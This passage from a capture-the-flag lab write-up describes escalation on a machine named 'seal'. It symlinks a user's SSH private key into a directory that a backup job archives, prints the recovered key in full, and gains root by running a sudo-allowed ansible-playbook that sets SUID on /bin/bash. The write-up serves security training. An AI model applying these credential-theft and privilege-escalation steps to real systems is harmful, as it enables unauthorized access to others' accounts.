</span></span></code></pre></div><p>Exploring the directory that is being backuped, we see that we have all permissions in the <code>uploads</code> directory:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>tomcat@seal:/var/lib/tomcat9$ ls -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard
</span></span><span style="display:flex"><span>total 100
</span></span><span style="display:flex"><span>drwxr-xr-x 7 root root  4096 May  7 09:26 .
</span></span><span style="display:flex"><span>drwxr-xr-x 3 root root  4096 May  6 10:48 ..
</span></span><span style="display:flex"><span>drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
</span></span><span style="display:flex"><span>drwxr-xr-x 2 root root  4096 Mar  7  2015 css
</span></span><span style="display:flex"><span>drwxr-xr-x 4 root root  4096 Mar  7  2015 images
</span></span><span style="display:flex"><span>-rw-r--r-- 1 root root 71744 May  6 10:42 index.html
</span></span><span style="display:flex"><span>drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
</span></span><span style="display:flex"><span>drwxrwxrwx 2 root root  4096 May  7 09:26 uploads
</span></span><span style="display:flex"><span>tomcat@seal:/var/lib/tomcat9$ ls -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads 
</span></span><span style="display:flex"><span>total 8
</span></span><span style="display:flex"><span>drwxrwxrwx 2 root root 4096 May  7 09:26 .
</span></span><span style="display:flex"><span>drwxr-xr-x 7 root root 4096 May  7 09:26 ..
</span></span></code></pre></div><p>To exploit this, we can create a symbolic link to the <code>id_rsa</code> of user <code>luis</code> into the <code>uploads</code> directory, so that it is backuped and compressed. Then we will be able to read it after decompressing the backup.</p><p>So, first we create the symbolic link:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>tomcat@seal:/var/lib/tomcat9$ ln -s /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/ 
</span></span><span style="display:flex"><span>tomcat@seal:/var/lib/tomcat9$ ls -la webapps/ROOT/admin/dashboard/uploads/
</span></span><span style="display:flex"><span>total 8
</span></span><span style="display:flex"><span>drwxrwxrwx 2 root   root   4096 Oct 25 20:00 .
</span></span><span style="display:flex"><span>drwxr-xr-x 7 root   root   4096 May  7 09:26 ..
</span></span><span style="display:flex"><span>lrwxrwxrwx 1 tomcat tomcat   22 Oct 25 20:00 id_rsa -&gt; /home/luis/.ssh/id_rsa
</span></span></code></pre></div><p>Then we see that the the backup is created, so we can copy it into <code>/tmp</code> and decompress it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>tomcat@seal:/var/lib/tomcat9$ cd /tmp
</span></span><span style="display:flex"><span>tomcat@seal:/tmp$ ls -la /opt/backups/archives/
</span></span><span style="display:flex"><span>total 604
</span></span><span style="display:flex"><span>drwxrwxr-x 2 luis luis   4096 Jul 15 16:05 .
</span></span><span style="display:flex"><span>drwxr-xr-x 4 luis luis   4096 Jul 15 16:05 ..
</span></span><span style="display:flex"><span>-rw-rw-r-- 1 luis luis 608921 Jul 15 16:05 backup-2021-07-15-16:05:32.gz
</span></span><span style="display:flex"><span>tomcat@seal:/tmp$ cp /opt/backups/archives/backup-2021-07-15-16:05:32.gz /tmp/backup.tar.gz 
</span></span><span style="display:flex"><span>tomcat@seal:/tmp$ tar -xf backup.tar.gz
</span></span></code></pre></div><p>With this process, we have exploited the permissions misconfiguration and obtained the SSH private key (<code>id_rsa</code>) of user <code>luis</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>tomcat@seal:/tmp$ ls -la
</span></span><span style="display:flex"><span>total 1208
</span></span><span style="display:flex"><span>drwxrwxrwt  4 root   root     4096 Jul 15 16:06 .
</span></span><span style="display:flex"><span>drwxr-xr-x 20 root   root     4096 May  7 09:26 ..
</span></span><span style="display:flex"><span>-rw-r-----  1 tomcat tomcat 608921 Jul 15 16:06 backup.tar.gz
</span></span><span style="display:flex"><span>drwxr-x---  7 tomcat tomcat   4096 May  7 09:26 dashboard
</span></span><span style="display:flex"><span>drwxr-x---  2 tomcat tomcat   4096 Jul 15 15:34 hsperfdata_tomcat
</span></span><span style="display:flex"><span>tomcat@seal:/tmp$ ls -la dashboard/uploads/
</span></span><span style="display:flex"><span>total 12
</span></span><span style="display:flex"><span>drwxr-x--- 2 tomcat tomcat 4096 Jul 15 16:06 .
</span></span><span style="display:flex"><span>drwxr-x--- 7 tomcat tomcat 4096 May  7 09:26 ..
</span></span><span style="display:flex"><span>-rw------- 1 tomcat tomcat 2590 May  7 06:10 id_rsa
</span></span><span style="display:flex"><span>tomcat@seal:/tmp$ cat dashboard/uploads/id_rsa
</span></span><span style="display:flex"><span>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span style="display:flex"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn 
</span></span><span style="display:flex"><span>NhAAAAAwEAAQAAAYEAs3kISCeddKacCQhVcpTTVcLxM9q2iQKzi9hsnlEt0Z7kchZrSZsG
</span></span><span style="display:flex"><span>DkID79g/4XrnoKXm2ud0gmZxdVJUAQ33Kg3Nk6czDI0wevr/YfBpCkXm5rsnfo5zjEuVGo
</span></span><span style="display:flex"><span>MTJhNZ8iOu7sCDZZA6sX48OFtuF6zuUgFqzHrdHrR4+YFawgP8OgJ9NWkapmmtkkxcEbF4
</span></span><span style="display:flex"><span>n1+v/l+74kEmti7jTiTSQgPr/ToTdvQtw12+YafVtEkB/8ipEnAIoD/B6JOOd4pPTNgX8R
</span></span><span style="display:flex"><span>MPWH93mStrqblnMOWJto9YpLxhM43v9I6EUje8gp/EcSrvHDBezEEMzZS+IbcP+hnw5ela
</span></span><span style="display:flex"><span>duLmtdTSMPTCWkpI9hXHNU9njcD+TRR/A90VHqdqLlaJkgC9zpRXB2096DVxFYdOLcjgeN
</span></span><span style="display:flex"><span>3rcnCAEhQ75VsEHXE/NHgO8zjD2o3cnAOzsMyQrqNXtPa+qHjVDch/T1TjSlCWxAFHy/OI
</span></span><span style="display:flex"><span>PxBupE/kbEoy1+dJHuR+gEp6yMlfqFyEVhUbDqyhAAAFgOAxrtXgMa7VAAAAB3NzaC1yc2
</span></span><span style="display:flex"><span>EAAAGBALN5CEgnnXSmnAkIVXKU01XC8TPatokCs4vYbJ5RLdGe5HIWa0mbBg5CA+/YP+F6
</span></span><span style="display:flex"><span>56Cl5trndIJmcXVSVAEN9yoNzZOnMwyNMHr6/2HwaQpF5ua7J36Oc4xLlRqDEyYTWfIjru
</span></span><span style="display:flex"><span>7Ag2WQOrF+PDhbbhes7lIBasx63R60ePmBWsID/DoCfTVpGqZprZJMXBGxeJ9fr/5fu+JB
</span></span><span style="display:flex"><span>JrYu404k0kID6/06E3b0LcNdvmGn1bRJAf/IqRJwCKA/weiTjneKT0zYF/ETD1h/d5kra6
</span></span><span style="display:flex"><span>m5ZzDlibaPWKS8YTON7/SOhFI3vIKfxHEq7xwwXsxBDM2UviG3D/oZ8OXpWnbi5rXU0jD0
</span></span><span style="display:flex"><span>wlpKSPYVxzVPZ43A/k0UfwPdFR6nai5WiZIAvc6UVwdtPeg1cRWHTi3I4Hjd63JwgBIUO+
</span></span><span style="display:flex"><span>VbBB1xPzR4DvM4w9qN3JwDs7DMkK6jV7T2vqh41Q3If09U40pQlsQBR8vziD8QbqRP5GxK
</span></span><span style="display:flex"><span>MtfnSR7kfoBKesjJX6hchFYVGw6soQAAAAMBAAEAAAGAJuAsvxR1svL0EbDQcYVzUbxsaw
</span></span><span style="display:flex"><span>MRTxRauAwlWxXSivmUGnJowwTlhukd2TJKhBkPW2kUXI6OWkC+it9Oevv/cgiTY0xwbmOX
</span></span><span style="display:flex"><span>AMylzR06Y5NItOoNYAiTVux4W8nQuAqxDRZVqjnhPHrFe/UQLlT/v/khlnngHHLwutn06n
</span></span><span style="display:flex"><span>bupeAfHqGzZYJi13FEu8/2kY6TxlH/2WX7WMMsE4KMkjy/nrUixTNzS+0QjKUdvCGS1P6L
</span></span><span style="display:flex"><span>hFB+7xN9itjEtBBiZ9p5feXwBn6aqIgSFyQJlU4e2CUFUd5PrkiHLf8mXjJJGMHbHne2ru
</span></span><span style="display:flex"><span>p0OXVqjxAW3qifK3UEp0bCInJS7UJ7tR9VI52QzQ/RfGJ+CshtqBeEioaLfPi9CxZ6LN4S
</span></span><span style="display:flex"><span>1zriasJdAzB3Hbu4NVVOc/xkH9mTJQ3kf5RGScCYablLjUCOq05aPVqhaW6tyDaf8ob85q
</span></span><span style="display:flex"><span>/s+CYaOrbi1YhxhOM8o5MvNzsrS8eIk1hTOf0msKEJ5mWo+RfhhCj9FTFSqyK79hQBAAAA
</span></span><span style="display:flex"><span>wQCfhc5si+UU+SHfQBg9lm8d1YAfnXDP5X1wjz+GFw15lGbg1x4YBgIz0A8PijpXeVthz2
</span></span><span style="display:flex"><span>ib+73vdNZgUD9t2B0TiwogMs2UlxuTguWivb9JxAZdbzr8Ro1XBCU6wtzQb4e22licifaa
</span></span><span style="display:flex"><span>WS/o1mRHOOP90jfpPOby8WZnDuLm4+IBzvcHFQaO7LUG2oPEwTl0ii7SmaXdahdCfQwkN5
</span></span><span style="display:flex"><span>NkfLXfUqg41nDOfLyRCqNAXu+pEbp8UIUl2tptCJo/zDzVsI4AAADBAOUwZjaZm6w/EGP6
</span></span><span style="display:flex"><span>KX6w28Y/sa/0hPhLJvcuZbOrgMj+8FlSceVznA3gAuClJNNn0jPZ0RMWUB978eu4J3se5O
</span></span><span style="display:flex"><span>plVaLGrzT88K0nQbvM3KhcBjsOxCpuwxUlTrJi6+i9WyPENovEWU5c79WJsTKjIpMOmEbM
</span></span><span style="display:flex"><span>kCbtTRbHtuKwuSe8OWMTF2+Bmt0nMQc9IRD1II2TxNDLNGVqbq4fhBEW4co1X076CUGDnx
</span></span><span style="display:flex"><span>5K5HCjel95b+9H2ZXnW9LeLd8G7oFRUQAAAMEAyHfDZKku36IYmNeDEEcCUrO9Nl0Nle7b
</span></span><span style="display:flex"><span>Vd3EJug4Wsl/n1UqCCABQjhWpWA3oniOXwmbAsvFiox5EdBYzr6vsWmeleOQTRuJCbw6lc
</span></span><span style="display:flex"><span>YG6tmwVeTbhkycXMbEVeIsG0a42Yj1ywrq5GyXKYaFr3DnDITcqLbdxIIEdH1vrRjYynVM
</span></span><span style="display:flex"><span>ueX7aq9pIXhcGT6M9CGUJjyEkvOrx+HRD4TKu0lGcO3LVANGPqSfks4r5Ea4LiZ4Q4YnOJ
</span></span><span style="display:flex"><span>u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
</span></span><span style="display:flex"><span>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><p>Now we have access as <code>luis</code> using SSH and we can read the <code>user.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ ssh -i id_rsa luis@10.10.10.250 
</span></span><span style="display:flex"><span>luis@seal:~$ cat user.txt
</span></span><span style="display:flex"><span>cd731341c30363c7787b8dc5132a8cbe
</span></span></code></pre></div><h2 id="privilege-escalation-with-sudo">Privilege escalation with <code>sudo</code></h2><p>This user can execute <code>ansible-playbook</code> as the <code>root</code> user with <code>sudo</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>luis@seal:~$ sudo -l
</span></span><span style="display:flex"><span>Matching Defaults entries for luis on seal:
</span></span><span style="display:flex"><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>User luis may run the following commands on seal:
</span></span><span style="display:flex"><span>    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
</span></span></code></pre></div><p>With Ansible Playbooks it is possible to run system commands (more information <a href="https://github.com/germainlefebvre4/ansible-cheatsheet">here</a>), so we simply add SUID permissions to <code>/bin/bash</code> and rooted (there is also a <a href="https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo">GTFOBin</a>).</p><p>We first create a YAML file with the actions we want to trigger:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-yaml" data-lang="yaml"><span style="display:flex"><span>- <span style="color:#f92672">hosts</span>: <span style="color:#ae81ff">localhost</span>
</span></span><span style="display:flex"><span>  <span style="color:#f92672">tasks</span>:
</span></span><span style="display:flex"><span>  - <span style="color:#f92672">command</span>: <span style="color:#ae81ff">chmod u+s /bin/bash </span>
</span></span></code></pre></div><p>Then using that YAML file, we can execute <code>ansible-playbook</code> and change permissions to <code>/bin/bash</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>luis@seal:~$ cd /tmp
</span></span><span style="display:flex"><span>luis@seal:/tmp$ vim file.yaml
</span></span><span style="display:flex"><span>luis@seal:/tmp$ cat file.yaml
</span></span><span style="display:flex"><span>- hosts: localhost
</span></span><span style="display:flex"><span>  tasks:
</span></span><span style="display:flex"><span>  - command: chmod u+s /bin/bash
</span></span><span style="display:flex"><span>luis@seal:~$ sudo /usr/bin/ansible-playbook file.yaml
</span></span><span style="display:flex"><span>[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match &#39;all&#39;
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>PLAY [localhost] ********************************************************************************************************************************************* 
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>TASK [Gathering Facts] ***************************************************************************************************************************************
</span></span><span style="display:flex"><span>ok: [localhost]
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>TASK [command] ***********************************************************************************************************************************************
</span></span><span style="display:flex"><span>[WARNING]: Consider using the file module with mode rather than running &#39;chmod&#39;.  If you need to use command because file is insufficient you can add &#39;warn:
</span></span><span style="display:flex"><span>false&#39; to this command task or set &#39;command_warnings=False&#39; in ansible.cfg to get rid of this message.
</span></span><span style="display:flex"><span>changed: [localhost]
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>PLAY RECAP ***************************************************************************************************************************************************
</span></span><span style="display:flex"><span>localhost                  : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>luis@seal:/tmp$ ls -la /bin/bash
</span></span><span style="display:flex"><span>-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
</span></span></code></pre></div><p>Finally, we can enter as <code>root</code> and read the <code>root.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>luis@seal:/tmp$ bash -p
</span></span><span style="display:flex"><span>bash-5.0# cat /root/root.txt
</span></span><span style="display:flex"><span>9fbff7ee6bedac04af30edca3ad223e6 
</span></span></code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#exploring-a-git-repository-in-gitbucket">Exploring a Git repository in GitBucket</a></li><li><a href="#finding-web-server-misconfigurations">Finding web server misconfigurations</a></li><li><a href="#foothold-on-the-machine">Foothold on the machine</a></li><li><a href="#lateral-movement-to-user-luis">Lateral movement to user <code>luis</code></a></li><li><a href="#privilege-escalation-with-sudo">Privilege escalation with <code>sudo</code></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit="return window.open(&#34;https://tinyletter.com/7Rocky&#34;,&#34;popupwindow&#34;,&#34;scrollbars=yes,width=800,height=600&#34;),!0"><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc">powered by <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky 2022</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>